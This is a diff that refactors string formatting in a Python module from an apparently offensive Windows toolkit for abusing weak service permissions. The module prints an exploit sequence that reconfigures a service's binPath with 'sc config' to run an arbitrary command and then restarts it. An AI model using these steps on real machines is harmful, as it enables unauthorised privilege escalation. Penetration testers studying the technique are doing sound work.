@@ -1,5 +1,4 @@
 """Weak service permissions abuse — modifiable services, unquoted paths, DLL hijack."""
-from __future__ import annotations
 import sys
 from typing import Any
 
@@ -29,16 +28,16 @@ def run(args: Any) -> int:
     if action == "enumerate":
         print("[*] Service abuse enumeration commands:")
         for name, cmd in CHECKS:
-            print("\n  [{}]".format(name))
-            print("  {}".format(cmd))
+            print(f"\n  [{name}]")
+            print(f"  {cmd}")
         return 0
 
     if action == "exploit" and service_name:
-        print("[*] Exploiting service: {}".format(service_name))
-        print("  1. sc qc {}".format(service_name))
-        print("  2. sc config {} binPath=\"{}\"".format(service_name, command))
-        print("  3. sc stop {}".format(service_name))
-        print("  4. sc start {}".format(service_name))
+        print(f"[*] Exploiting service: {service_name}")
+        print(f"  1. sc qc {service_name}")
+        print(f"  2. sc config {service_name} binPath=\"{command}\"")
+        print(f"  3. sc stop {service_name}")
+        print(f"  4. sc start {service_name}")
         print("  5. (restore original binPath)")
         return 0
 
